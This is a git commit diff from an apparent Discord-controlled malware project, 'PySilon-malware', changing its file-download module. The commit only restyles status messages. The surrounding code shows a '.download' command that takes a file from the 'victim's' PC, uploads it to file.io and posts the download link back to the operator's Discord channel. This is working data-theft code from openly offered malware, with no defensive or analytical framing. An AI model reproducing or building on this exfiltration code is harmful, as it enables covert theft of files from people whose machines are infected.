7db0efc11ab965710a32b24829e6e49bd120bae6
JuicyChann <nik.xeiladakis@gmail.com>
2023-08-29 23:13:39 +0300

    beautify downloading text

--- resources/source_code/file_downloading.py
+++ resources/source_code/file_downloading.py
@@ -34,9 +34,7 @@ elif message.content[:9] == '.download':
                                 message.channel.send(e)
                                 #.log Sent message with information about this error. Aborting operation 
                                 pass
-                embed = discord.Embed(title="🟢 Success",description=f'```Uploading to file.io... This can take a while depending on the file size, amount and the victim\'s internet speed..```', colour=discord.Colour.green())
-                embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
-                await message.channel.send(embed=embed)
+                await message.channel.send("```Uploading to file.io... This can take a while depending on the file size, amount and the victim's internet speed..```")
                 #.log Sent message about File.io upload 
                 data = {
                     'file': open(target_file, 'rb')
@@ -47,7 +45,9 @@ elif message.content[:9] == '.download':
                 #.log Uploaded the file onto File.io
                 data = response.json()
                 #.log Received response from File.io 
-                await message.channel.send(f"```{message.content[10:]}.zip:``` {data['link']}")
+                embed = discord.Embed(title=f"🟢 {message.content[10:]}",description=f"Click [here](<{data['link']}>) to download.", colour=discord.Colour.green())
+                embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
+                await message.channel.send(embed=embed)
                 #.log Sent Anonfiles link to uploaded file 
             else:
                 #.log File requested by Author does not exist on this PC 
